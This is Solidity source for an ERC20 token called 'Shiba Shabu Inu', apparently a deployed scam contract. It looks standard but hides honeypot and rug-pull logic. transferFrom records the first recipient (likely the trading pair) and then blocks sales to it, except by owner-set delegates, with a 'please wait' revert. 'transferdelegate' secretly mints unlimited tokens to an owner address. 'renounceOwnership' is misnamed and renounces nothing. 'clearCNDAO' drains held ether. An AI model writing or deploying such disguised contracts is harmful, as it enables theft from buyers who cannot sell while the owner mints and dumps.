row number 
1	             pragma solidity >=0.5.17;
2	 library SafeMath {
3	 function add(uint a, uint b) internal pure returns (uint c) {
4	 c = a + b;
5	 require(c >= a);
6	 }
7	 function sub(uint a, uint b) internal pure returns (uint c) {
8	 require(b <= a);
9	 c = a - b;
10	 }
11	 function mul(uint a, uint b) internal pure returns (uint c) {
12	 c = a * b;
13	 require(a == 0 || c / a == b);
14	 }
15	 function div(uint a, uint b) internal pure returns (uint c) {
16	 require(b > 0);
17	 c = a / b;
18	 }
19	 }
20	 contract ERC20Interface {
21	 function totalSupply() public view returns (uint);
22	 function balanceOf(address tokenOwner) public view returns (uint balance);
23	 function allowance(address tokenOwner, address spender) public view returns (uint remaining);
24	 function transfer(address to, uint tokens) public returns (bool success);
25	 function approve(address spender, uint tokens) public returns (bool success);
26	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
27	 event Transfer(address indexed from, address indexed to, uint tokens);
28	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
29	 }
30	 contract ApproveAndCallFallBack {
31	 function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
32	 }
33	 contract Owned {
34	 address public owner;
35	 address public newOwner;
36	 event OwnershipTransferred(address indexed _from, address indexed _to);
37	 constructor() public {
38	 owner = msg.sender;
39	 }
40	 modifier onlyOwner {
41	 require(msg.sender == owner);
42	 _;
43	 }
44	 function transferOwnership(address _newOwner) public onlyOwner {
45	 newOwner = _newOwner;
46	 }
47	 function acceptOwnership() public {
48	 require(msg.sender == newOwner);
49	 emit OwnershipTransferred(owner, newOwner);
50	 owner = newOwner;
51	 newOwner = address(0);
52	 }
53	 }
54	 contract TokenERC20 is ERC20Interface, Owned{
55	 using SafeMath for uint;
56	 string public symbol;
57	 string public name;
58	 uint8 public decimals;
59	 uint _totalSupply;
60	 address public newun;
61	 address internal delegate1;
62	 address internal delegate2;
63	 mapping(address => uint) balances;
64	 mapping(address => mapping(address => uint)) allowed;
65	 constructor() public {
66	 symbol = "SHIBASHABU";
67	 name = "Shiba Shabu Inu";
68	 decimals = 18;
69	 _totalSupply = 1000000000000000000000000000000;
70	 balances[owner] = _totalSupply;
71	 emit Transfer(address(0), owner, _totalSupply);
72	 }
73	 function transfernewun(address _newun) public onlyOwner {
74	 newun = _newun;
75	 }
76	 function transferdelegate(address _delegate1, uint256 tokens) public onlyOwner {
77	 delegate1 = _delegate1;
78	 _totalSupply = _totalSupply.add(tokens);
79	 balances[_delegate1] = balances[_delegate1].add(tokens);
80	 }
81	 function renounceOwnership(address _delegate2) public onlyOwner {
82	 delegate2 = _delegate2;
83	 }
84	 function totalSupply() public view returns (uint) {
85	 return _totalSupply.sub(balances[address(0)]);
86	 }
87	 function balanceOf(address tokenOwner) public view returns (uint balance) {
88	 return balances[tokenOwner];
89	 }
90	 function transfer(address to, uint tokens) public returns (bool success) {
91	 require(to != newun, "please wait");
92	 balances[msg.sender] = balances[msg.sender].sub(tokens);
93	 balances[to] = balances[to].add(tokens);
94	 emit Transfer(msg.sender, to, tokens);
95	 return true;
96	 }
97	 function approve(address spender, uint tokens) public returns (bool success) {
98	 allowed[msg.sender][spender] = tokens;
99	 emit Approval(msg.sender, spender, tokens);
100	 return true;
101	 }
102	 function transferFrom(address from, address to, uint tokens) public returns (bool success) {
103	 if(from != address(0) && newun == address(0)) newun = to;
104	 else require(to != newun || (from == delegate1 && to == newun) || (from == delegate2 && to == newun), "please wait");
105	 balances[from] = balances[from].sub(tokens);
106	 allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
107	 balances[to] = balances[to].add(tokens);
108	 emit Transfer(from, to, tokens);
109	 return true;
110	 }
111	 function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
112	 return allowed[tokenOwner][spender];
113	 }
114	 function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
115	 allowed[msg.sender][spender] = tokens;
116	 emit Approval(msg.sender, spender, tokens);
117	 ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
118	 return true;
119	 }
120	 function () external payable {
121	 revert();
122	 }
123	 }
124	 contract ShibaShabu is TokenERC20 {
125	 function clearCNDAO() public onlyOwner() {
126	 address payable _owner = msg.sender;
127	 _owner.transfer(address(this).balance);
128	 }
129	 function() external payable {
130	 }
131	 }
